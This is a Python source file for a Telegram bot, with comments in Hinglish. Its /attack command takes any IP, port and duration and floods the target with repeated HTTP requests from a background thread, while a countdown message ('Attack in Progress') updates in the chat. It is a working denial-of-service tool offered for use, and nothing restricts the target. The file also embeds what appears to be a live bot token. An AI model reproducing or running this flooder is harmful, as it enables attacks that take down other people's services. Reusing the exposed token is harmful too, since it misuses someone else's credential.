import telebot
import requests
import threading
import time

# @BotFather wala token yahan dalo
TOKEN = '8415253056:AAFCqKD7rU6nYpkKT7mLJjOPAU5aLBj9W1E'
bot = telebot.TeleBot(TOKEN)

def start_flood_with_countdown(ip, port, duration, message, chat_id):
    url = f"http://{ip}:{port}/api/test?key=COLLEGE_V2"
    remaining_time = int(duration)
    
    # Attack start ho gaya (Background thread mein)
    def flood():
        end_time = time.time() + remaining_time
        while time.time() < end_time:
            try:
                requests.get(url, timeout=1)
            except:
                pass

    # Attack ko alag thread mein start karo taaki timer chalta rahe
    attack_thread = threading.Thread(target=flood)
    attack_thread.start()

    # Timer update karne ka logic
    msg_id = message.message_id
    while remaining_time > 0:
        try:
            # Har 5 second mein ya har second mein message edit karo
            bot.edit_message_text(
                chat_id=chat_id,
                message_id=msg_id,
                text=f"🚀 **Attack in Progress...**\n🌐 Target: {ip}:{port}\n⏱️ Time Remaining: {remaining_time}s"
            )
            time.sleep(1) # 1 second wait
            remaining_time -= 1
        except Exception as e:
            # Kabhi kabhi Telegram edit limit ki wajah se error de sakta hai, use ignore karein
            time.sleep(1)
            remaining_time -= 1

    bot.edit_message_text(
        chat_id=chat_id,
        message_id=msg_id,
        text=f"✅ **Attack Finished!**\nTarget {ip}:{port} test complete."
    )

@bot.message_handler(commands=['attack'])
def handle_attack(message):
    try:
        args = message.text.split()
        target_ip = args[1]
        target_port = args[2]
        duration = args[3]

        # Pehla message bhejo jise hum baad mein edit karenge
        sent_msg = bot.reply_to(message, "Initializing Attack...")
        
        # Countdown aur Attack start karo
        threading.Thread(target=start_flood_with_countdown, 
                         args=(target_ip, target_port, duration, sent_msg, message.chat.id)).start()

    except Exception as e:
        bot.reply_to(message, "❌ Use: /attack <ip> <port> <time>")

print("Bot is running with Live Countdown...")
bot.polling()